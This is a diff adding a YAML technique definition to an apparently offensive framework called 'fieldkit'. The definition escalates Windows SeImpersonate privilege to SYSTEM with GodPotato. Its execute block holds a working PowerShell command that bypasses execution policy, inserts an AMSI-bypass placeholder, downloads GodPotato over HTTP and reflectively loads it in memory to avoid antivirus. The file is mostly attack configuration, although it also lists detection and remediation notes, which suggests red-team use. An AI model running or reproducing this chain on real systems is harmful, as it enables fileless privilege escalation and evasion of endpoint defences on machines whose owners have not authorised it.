@@ -1,0 +1,41 @@
+# SeImpersonate → SYSTEM via GodPotato (in-memory reflective load)
+#
+# Reflectively loads the same GodPotato.exe over HTTP into the current
+# PowerShell process's AppDomain — nothing lands on disk. Escalate loop
+# climbs here when the native rung is caught by AV.
+#
+# The {{url}} + {{served}} + {{amsi}} single-brace placeholders are
+# resolved by fieldkit.provision at serve time — NOT substituted here.
+technique: T1134.002
+name: SeImpersonate → SYSTEM (GodPotato, in-memory reflective load)
+tactic: [privilege-escalation, defense-evasion]
+platform: [windows]
+key: seimpersonate:ps-godpotato
+family: seimpersonate
+delivery: inmem-fileless
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: moderate
+detect:
+  privilege: [SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege]
+execute:
+  shell: cmd
+  command: |-
+    powershell -ep bypass -c "{amsi}$a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('{url}{served}'));$a.EntryPoint.Invoke($null,@(,[string[]]@('-cmd','cmd /c whoami')))"
+  serves:
+    - GodPotato
+cleanup:
+  command: ""
+verify:
+  success: "NT AUTHORITY"
+report:
+  vector_type: seimpersonate
+  description: >
+    Reflectively loads GodPotato.exe (served over HTTP by fieldkit) into the
+    current PowerShell process. The .NET assembly's EntryPoint is invoked
+    directly; no .exe touches disk. GodPotato (RPC/DCOM, .NET) — broad coverage: Server 2012–2022, Win8–11.
+  remediation: >
+    ScriptBlock logging + AMSI must be enforced. Constrained Language Mode
+    for PowerShell defeats [Reflection.Assembly]::Load; deploy WDAC/CLM.
+  refs: [T1134.002, T1620, GodPotato]
